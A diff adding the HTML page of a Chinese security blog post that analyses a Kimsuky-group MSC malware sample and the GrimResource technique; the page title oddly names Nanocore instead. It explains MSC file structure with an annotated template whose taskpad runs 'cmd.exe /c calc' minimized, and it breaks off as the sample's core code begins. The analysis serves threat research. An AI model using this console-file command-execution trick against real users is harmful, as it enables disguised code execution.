@@ -1,0 +1,356 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Nanocore恶意程序分析 | Y5neKO's Blog</title><meta name="author" content="Y5neKO"><meta name="copyright" content="Y5neKO"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="从Kimsuky组织msc攻击样本到GrimResource前言近期笔者通过外网监测到一个Kimsuky组织的msc攻击样本，这里对样本进行分析，以及谈谈其利用的攻击技术 1SHA256: 57e9b7d1c18684a4e8b3688c454e832833e063019ed808fd69186c4e20df930a  msc文件 MSC(Microsoft Snap-In Control)文件，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Nanocore恶意程序分析">
+<meta property="og:url" content="https://y5neko.github.com/2024/09/12/%E4%BB%8EKimsuky%E7%BB%84%E7%BB%87msc%E6%94%BB%E5%87%BB%E6%A0%B7%E6%9C%AC%E5%88%B0GrimResource/index.html">
+<meta property="og:site_name" content="Y5neKO&#39;s Blog">
+<meta property="og:description" content="从Kimsuky组织msc攻击样本到GrimResource前言近期笔者通过外网监测到一个Kimsuky组织的msc攻击样本，这里对样本进行分析，以及谈谈其利用的攻击技术 1SHA256: 57e9b7d1c18684a4e8b3688c454e832833e063019ed808fd69186c4e20df930a  msc文件 MSC(Microsoft Snap-In Control)文件，">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://y5neko.github.com/image/image-20240914112951079.png">
+<meta property="article:published_time" content="2024-09-11T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-09-14T08:32:38.108Z">
+<meta property="article:author" content="Y5neKO">
+<meta property="article:tag" content="笔记">
+<meta property="article:tag" content="样本分析">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://y5neko.github.com/image/image-20240914112951079.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://y5neko.github.com/2024/09/12/%E4%BB%8EKimsuky%E7%BB%84%E7%BB%87msc%E6%94%BB%E5%87%BB%E6%A0%B7%E6%9C%AC%E5%88%B0GrimResource/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?d4f6675f179ef53324ef6281fc51a93c";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: {"limitDay":1000,"position":"top","messagePrev":"这篇文章最后更新时间是","messageNext":"天之前，描述可能已经失效，请谨慎辨别."},
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: Y5neKO","link":"链接: ","source":"来源: Y5neKO's Blog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体中文","cht_to_chs":"你已切换为简体中文","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: true,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Nanocore恶意程序分析',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-09-14 16:32:38'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const now = new Date()
+          const hour = now.getHours()
+          const isNight = hour <= 6 || hour >= 18
+          if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+          else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body><script>window.paceOptions = {
+  restartOnPushState: false
+}
+
+document.addEventListener('pjax:send', () => {
+  Pace.restart()
+})
+</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js/themes/blue/pace-theme-minimal.min.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "/img/friend_404.gif" data-lazy-src="https://q1.qlogo.cn/g?b=qq&amp;nk=1727058834&amp;s=640" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">13</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/image/image-20240914112951079.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Y5neKO's Blog"><span class="site-name">Y5neKO's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Nanocore恶意程序分析</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-09-11T16:00:00.000Z" title="发表于 2024-09-12 00:00:00">2024-09-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-09-14T08:32:38.108Z" title="更新于 2024-09-14 16:32:38">2024-09-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/">样本分析</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>12分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Nanocore恶意程序分析"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2024/09/12/%E4%BB%8EKimsuky%E7%BB%84%E7%BB%87msc%E6%94%BB%E5%87%BB%E6%A0%B7%E6%9C%AC%E5%88%B0GrimResource/#post-comment"><span class="gitalk-comment-count"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="从Kimsuky组织msc攻击样本到GrimResource"><a href="#从Kimsuky组织msc攻击样本到GrimResource" class="headerlink" title="从Kimsuky组织msc攻击样本到GrimResource"></a>从Kimsuky组织msc攻击样本到GrimResource</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>近期笔者通过外网监测到一个Kimsuky组织的msc攻击样本，这里对样本进行分析，以及谈谈其利用的攻击技术</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHA256: 57e9b7d1c18684a4e8b3688c454e832833e063019ed808fd69186c4e20df930a</span><br></pre></td></tr></table></figure>
+
+<h2 id="msc文件"><a href="#msc文件" class="headerlink" title="msc文件"></a>msc文件</h2><blockquote>
+<p>MSC(Microsoft Snap-In Control)文件，是微软管理控制台MMC(Microsoft Management Console)用来添加&#x2F;删除的嵌入式管理单元文件。通常通过MMC来管理，可点击“文件”菜单中的“添加&#x2F;删除管理单元”操作来管理当前系统中已经安装的MSC文件。可以点击开始&#x2F;运行，然后输入下列文件名就可以打开相应的控制窗口。</p>
+</blockquote>
+<p>看到这个后缀，很多人可能已经想到了组策略编辑器(gpedit.msc)，该样本即是通过msc文件实现攻击，利用特制的管理保存控制台 (MSC) 文件来使用 Microsoft 管理控制台 ( MMC ) 获得完整的代码执行并逃避安全防御</p>
+<p>这项技术最早由Elastic 安全实验室在2024 年 6 月 6 日识别出上传到 VirusTotal 恶意软件扫描平台的工件（“ sccm-updater.msc ”），并将该方法命名为GrimResource ，前段时间热门的“银狐”黑产组织也曾利用过该项技术</p>
+<p>最初“GrimResource”技术的核心是利用了apds.dll库中存在的一个旧的跨站脚本（XSS）漏洞，通过在制作的MSC文件的StringTable部分适当地引用这个易受攻击的APDS资源，攻击者可以在mmc.exe的上下文中执行任意的JavaScript，本文中的样本攻击方式则有所不同</p>
+<h2 id="msc文件结构"><a href="#msc文件结构" class="headerlink" title="msc文件结构"></a>msc文件结构</h2><p>首先大概认识一下msc文件，这里以组策略编辑器的msc文件为例：</p>
+<p><img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240913170745030.png" alt="image-20240913170745030"></p>
+<p>msc文件本质上是一种XML格式的文件，其中包含一些定义的内容，这里以重要的部分进行解释</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span> 												# xml头</span><br><span class="line"><span class="tag">&lt;<span class="name">MMC_ConsoleFile</span>&gt;</span>												    # 整个MMC控制台内容的标签</span><br><span class="line">    <span class="tag">&lt;<span class="name">ConsoleFileID</span>&gt;</span>XXX<span class="tag">&lt;/<span class="name">ConsoleFileID</span>&gt;</span>								 # msc文件id</span><br><span class="line">    <span class="tag">&lt;<span class="name">FrameState</span>&gt;</span>xxx<span class="tag">&lt;/<span class="name">FrameState</span>&gt;</span>										# 保存了管理控制台窗口的布局和状态信息</span><br><span class="line">    <span class="tag">&lt;<span class="name">Views</span>&gt;</span>														   # 定义和保存管理控制台中的视图设置</span><br><span class="line">        <span class="tag">&lt;<span class="name">View</span>&gt;</span></span><br><span class="line">          XXX</span><br><span class="line">        <span class="tag">&lt;/<span class="name">View</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Views</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">VisualAttributes</span>&gt;</span>												# 定义管理控制台（MMC）的视觉属性和界面元素的外观设置</span><br><span class="line">        <span class="tag">&lt;<span class="name">Icon</span> <span class="attr">Index</span>=<span class="string">&quot;0&quot;</span> <span class="attr">File</span>=<span class="string">&quot;xxxx&quot;</span>&gt;</span>								 # 图标dll地址（dll/exe）</span><br><span class="line">          <span class="tag">&lt;<span class="name">Image</span> <span class="attr">Name</span>=<span class="string">&quot;Large&quot;</span> <span class="attr">BinaryRefIndex</span>=<span class="string">&quot;0&quot;</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">Image</span> <span class="attr">Name</span>=<span class="string">&quot;Small&quot;</span> <span class="attr">BinaryRefIndex</span>=<span class="string">&quot;1&quot;</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">Image</span> <span class="attr">Name</span>=<span class="string">&quot;Large48x&quot;</span> <span class="attr">BinaryRefIndex</span>=<span class="string">&quot;2&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Icon</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">VisualAttributes</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ScopeTree</span>&gt;</span>														# 定义和保存管理控制台的“范围树”（Scope Tree）部分的结构和配置。</span><br><span class="line">    	<span class="tag">&lt;<span class="name">SnapinCache</span>&gt;</span><span class="tag">&lt;/<span class="name">SnapinCache</span>&gt;</span>									 # 用于缓存管理单元（snap-ins）的配置信息和状态。</span><br><span class="line">        </span><br><span class="line">        <span class="tag">&lt;<span class="name">Nodes</span>&gt;</span>														# 视图中节点相关的信息</span><br><span class="line">      		<span class="tag">&lt;<span class="name">Node</span> <span class="attr">ID</span>=<span class="string">&quot;1&quot;</span> <span class="attr">ImageIdx</span>=<span class="string">&quot;0&quot;</span> <span class="attr">CLSID</span>=<span class="string">&quot;&#123;xxx&#125;&quot;</span> <span class="attr">Preload</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Nodes</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">String</span> <span class="attr">Name</span>=<span class="string">&quot;Name&quot;</span> <span class="attr">ID</span>=<span class="string">&quot;3&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Bitmaps</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">BinaryData</span> <span class="attr">Name</span>=<span class="string">&quot;Small&quot;</span> <span class="attr">BinaryRefIndex</span>=<span class="string">&quot;3&quot;</span>/&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">BinaryData</span> <span class="attr">Name</span>=<span class="string">&quot;Large&quot;</span> <span class="attr">BinaryRefIndex</span>=<span class="string">&quot;4&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">Bitmaps</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ComponentDatas</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">ComponentData</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">GUID</span> <span class="attr">Name</span>=<span class="string">&quot;Snapin&quot;</span>&gt;</span>&#123;xxx&#125;<span class="tag">&lt;/<span class="name">GUID</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Stream</span> <span class="attr">BinaryRefIndex</span>=<span class="string">&quot;5&quot;</span>/&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">ComponentData</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">ComponentDatas</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Components</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">Node</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Nodes</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">    <span class="tag">&lt;/<span class="name">ScopeTree</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">ConsoleTaskpads</span>&gt;</span>												# 重点：用于定义和保存管理控制台（MMC）的任务面板配置，在控制台的特定部分显示任务、操作和快捷方式。</span><br><span class="line">    	<span class="tag">&lt;<span class="name">ConsoleTaskpad</span>&gt;</span></span><br><span class="line">		   <span class="tag">&lt;<span class="name">String</span> <span class="attr">Name</span>=<span class="string">&quot;Name&quot;</span> <span class="attr">ID</span>=<span class="string">&quot;11&quot;</span>/&gt;</span></span><br><span class="line">		   <span class="tag">&lt;<span class="name">String</span> <span class="attr">Name</span>=<span class="string">&quot;Description&quot;</span> <span class="attr">ID</span>=<span class="string">&quot;12&quot;</span>/&gt;</span></span><br><span class="line">		   <span class="tag">&lt;<span class="name">String</span> <span class="attr">Name</span>=<span class="string">&quot;Tooltip&quot;</span> <span class="attr">Value</span>=<span class="string">&quot;&quot;</span>/&gt;</span></span><br><span class="line">		   <span class="tag">&lt;<span class="name">Tasks</span>&gt;</span>												   # 任务相关设置</span><br><span class="line">                <span class="tag">&lt;<span class="name">Task</span> <span class="attr">Type</span>=<span class="string">&quot;CommandLine（任务类型）&quot;</span> <span class="attr">Command</span>=<span class="string">&quot;cmd.exe（命令）&quot;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">String</span> <span class="attr">Name</span>=<span class="string">&quot;Name&quot;</span> <span class="attr">ID</span>=<span class="string">&quot;13&quot;</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">String</span> <span class="attr">Name</span>=<span class="string">&quot;Description&quot;</span> <span class="attr">ID</span>=<span class="string">&quot;14&quot;</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">Symbol</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">Image</span> <span class="attr">Name</span>=<span class="string">&quot;Small&quot;</span> <span class="attr">BinaryRefIndex</span>=<span class="string">&quot;6&quot;</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">Image</span> <span class="attr">Name</span>=<span class="string">&quot;Large&quot;</span> <span class="attr">BinaryRefIndex</span>=<span class="string">&quot;7&quot;</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">Symbol</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">CommandLine</span> <span class="attr">Directory</span>=<span class="string">&quot;&quot;</span> <span class="attr">WindowState</span>=<span class="string">&quot;Minimized（窗口最小化）&quot;</span> <span class="attr">Params</span>=<span class="string">&quot;/c calc（参数）&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">Task</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">Tasks</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ConsoleTaskpad</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ConsoleTaskpads</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">ViewSettingsCache</span>&gt;</span>xxx<span class="tag">&lt;/<span class="name">ViewSettingsCache</span>&gt;</span>						# 缓存管理控制台（MMC）的视图设置</span><br><span class="line">    <span class="tag">&lt;<span class="name">ColumnSettingsCache</span>&gt;</span><span class="tag">&lt;/<span class="name">ColumnSettingsCache</span>&gt;</span>						# 缓存和保存管理控制台（MMC）中表格视图的列设置</span><br><span class="line">    <span class="tag">&lt;<span class="name">StringTables</span>&gt;</span>												 # 定义和管理控制台界面中的字符串资源，用于界面中的标签、菜单项、按钮文字以及其他显示文本</span><br><span class="line">        <span class="tag">&lt;<span class="name">IdentifierPool</span> <span class="attr">AbsoluteMin</span>=<span class="string">&quot;1&quot;</span> <span class="attr">AbsoluteMax</span>=<span class="string">&quot;65535&quot;</span> <span class="attr">NextAvailable</span>=<span class="string">&quot;15&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">StringTable</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">GUID</span>&gt;</span>&#123;xxxx&#125;<span class="tag">&lt;/<span class="name">GUID</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">Strings</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">String</span> <span class="attr">ID</span>=<span class="string">&quot;1&quot;</span> <span class="attr">Refs</span>=<span class="string">&quot;1&quot;</span>&gt;</span>Local Group Policy Editor<span class="tag">&lt;/<span class="name">String</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">String</span> <span class="attr">ID</span>=<span class="string">&quot;2&quot;</span> <span class="attr">Refs</span>=<span class="string">&quot;1&quot;</span>&gt;</span>Favorites<span class="tag">&lt;/<span class="name">String</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">String</span> <span class="attr">ID</span>=<span class="string">&quot;3&quot;</span> <span class="attr">Refs</span>=<span class="string">&quot;1&quot;</span>&gt;</span>Local Computer Policy<span class="tag">&lt;/<span class="name">String</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">String</span> <span class="attr">ID</span>=<span class="string">&quot;4&quot;</span> <span class="attr">Refs</span>=<span class="string">&quot;2&quot;</span>&gt;</span>Console Root<span class="tag">&lt;/<span class="name">String</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">Strings</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">StringTable</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">StringTables</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">BinaryStorage</span>&gt;</span>												# 用于存储二进制数据</span><br><span class="line">        <span class="tag">&lt;<span class="name">Binary</span> <span class="attr">Name</span>=<span class="string">&quot;CONSOLE_FILE_ICON_LARGE&quot;</span>&gt;</span></span><br><span class="line">        Base64 编码或其他编码方式</span><br><span class="line">        <span class="tag">&lt;/<span class="name">Binary</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">BinaryStorage</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">MMC_ConsoleFile</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="样本分析"><a href="#样本分析" class="headerlink" title="样本分析"></a>样本分析</h2><p>我们已经大致了解了msc文件的结构，有兴趣的话之后会专门写一篇文章来分析</p>
+<p>现在开始分析样本</p>
+<p><img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240914094900300.png" alt="image-20240914094900300"></p>
+<p>这里可以看到使用了word的图标用以迷惑受害者，看样子应该是针对韩国地区发起的攻击</p>
+<p>文本格式打开样本</p>
+<p><img src= "/img/friend_404.gif" data-lazy-src="/image-20240914095037388.png" alt="image-20240914095037388"></p>
+<p>总体结构和刚刚分析的大致一样，其中<code>MMC_ConsoleFile-&gt;VisualAttributes-&gt;Icon</code>部分引用了word的路径，也就是图标部分</p>
+<p>往下翻来到重点部分</p>
+<h3 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a>核心代码</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ConsoleTaskpads</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ConsoleTaskpad</span> <span class="attr">ListSize</span>=<span class="string">&quot;Medium&quot;</span> <span class="attr">IsNodeSpecific</span>=<span class="string">&quot;true&quot;</span> <span class="attr">ReplacesDefaultView</span>=<span class="string">&quot;false&quot;</span> <span class="attr">NoResults</span>=<span class="string">&quot;true&quot;</span> <span class="attr">DescriptionsAsText</span>=<span class="string">&quot;true&quot;</span> <span class="attr">NodeType</span>=<span class="string">&quot;&#123;C96401CE-0E17-11D3-885B-00C04F72C717&#125;&quot;</span> <span class="attr">ID</span>=<span 